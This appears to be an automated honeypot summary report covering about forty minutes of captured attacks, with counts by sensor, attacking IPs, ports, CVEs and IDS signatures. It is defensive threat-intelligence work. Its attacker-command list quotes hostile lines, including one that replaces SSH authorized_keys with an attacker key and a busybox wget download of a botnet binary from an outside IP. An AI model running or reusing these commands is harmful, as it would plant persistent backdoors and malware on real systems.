# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-20T16:01:52Z
**Timeframe Covered:** 2025-10-20T15:20:01Z to 2025-10-20T16:00:01Z
**Files Used in this Report:**
- agg_log_20251020T152001Z.json
- agg_log_20251020T154001Z.json
- agg_log_20251020T160001Z.json

---

### Executive Summary

This report summarizes 17,907 events captured by the honeypot network. The majority of attacks were logged by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute force and command injection attacks. A significant portion of the activity originated from IP address `181.12.133.131`. The most frequently targeted port was `445` (SMB), suggesting widespread scanning for vulnerabilities like EternalBlue. Attackers were observed attempting to download and execute malicious payloads, add SSH keys for persistence, and enumerate system information. A wide range of CVEs were targeted, reflecting a diverse set of exploits being used in automated attacks.

---

### Detailed Analysis

**Attacks by Honeypot:**
- **Cowrie:** 6,776
- **Honeytrap:** 3,993
- **Suricata:** 2,876
- **Dionaea:** 2,518
- **Mailoney:** 1,129
- **Sentrypeer:** 371
- **H0neytr4p:** 50
- **Ciscoasa:** 49
- **Redishoneypot:** 34
- **Tanner:** 31
- **ConPot:** 30
- **ElasticPot:** 24
- **Dicompot:** 9
- **Honeyaml:** 9
- **Adbhoney:** 6
- **Ipphoney:** 2

**Top Attacking IPs:**
- 181.12.133.131
- 62.117.109.194
- 72.146.232.13
- 157.230.169.149
- 196.251.88.103
- 85.208.84.222
- 165.232.88.6
- 165.227.32.198
- 128.199.16.167
- 103.139.192.221

**Top Targeted Ports/Protocols:**
- TCP/445 & 445 (SMB)
- 22 (SSH)
- 25 (SMTP)
- 5060 (SIP)
- 5903 (VNC)
- 5985 (WinRM)
- 5901 (VNC)

**Most Common CVEs:**
- CVE-2001-0414
- CVE-2002-0012, CVE-2002-0013, CVE-1999-0517
- CVE-2006-2369
- CVE-2006-3602, CVE-2006-4458, CVE-2006-4542
- CVE-2009-2765
- CVE-2014-6271
- CVE-2015-2051, CVE-2019-10891, CVE-2022-37056, CVE-2024-33112, CVE-2025-11488
- CVE-2016-20017
- CVE-2016-6563
- CVE-2018-10561, CVE-2018-10562
- CVE-2018-11776
- CVE-2019-11500
- CVE-2019-16920
- CVE-2021-3449
- CVE-2021-35394, CVE-2021-35395
- CVE-2021-42013
- CVE-2023-31983
- CVE-2023-47565
- CVE-2023-52163
- CVE-2024-10914
- CVE-2024-12856, CVE-2024-12885
- CVE-2024-3721

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | ...`
- `uname -a`
- `whoami`
- `tftp; wget; /bin/busybox NZSZF`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET HUNTING RDP Authentication Bypass Attempt
- ET INFO Reserved Internal IP Traffic
- ET SCAN Potential SSH Scan
- ET SCAN Suspicious inbound to PostgreSQL port 5432
- ET DROP Spamhaus DROP Listed Traffic Inbound
- ET CINS Active Threat Intelligence Poor Reputation IP

**Users / Login Attempts (Username/Password):**
- 345gs5662d34/345gs5662d34
- user01/Password01
- root/Admin1234!
- deploy/123123
- root/admin123kpvp
- root/3245gs5662d34
- ftpuser/ftp
- debian/P@ssw0rd
- root/admin2013
- deploy/1234

**Files Uploaded/Downloaded:**
- gpon80&ipv=0
- soap-envelope
- server.cgi
- rondo.dgx.sh
- Mozi.m
- XMLSchema-instance
- arm.urbotnetisass (and other variants)
- ohsitsvegawellrip.sh

**HTTP User-Agents:**
- No user-agents were recorded in this period.

**SSH Clients:**
- No specific SSH clients were recorded in this period.

**SSH Servers:**
- No specific SSH servers were recorded in this period.

**Top Attacker AS Organizations:**
- No AS organizations were recorded in this period.

---

### Key Observations and Anomalies

- **High Volume of SMB Scans:** The consistent targeting of port 445 indicates that attackers are actively and broadly searching for systems vulnerable to SMB exploits, likely related to the DoublePulsar backdoor detections by Suricata.
- **Credential Stuffing and Brute-Forcing:** The variety of login attempts captured by Cowrie, using common and default credentials, highlights the ongoing threat of brute-force attacks against SSH.
- **Automated Payload Delivery:** Commands observed include attempts to download and execute shell scripts and binaries (e.g., `urbotnetisass`, `Mozi.m`) using `wget` and `curl`. This is characteristic of botnet propagation.
- **Persistence Techniques:** A recurring command involves attackers attempting to add their own SSH public key to the `authorized_keys` file. This is a common tactic to ensure persistent access to a compromised machine.
- **System Enumeration:** Attackers frequently run commands like `uname -a`, `whoami`, and `cat /proc/cpuinfo` to identify the system's architecture and environment, likely to tailor subsequent attacks or payloads.
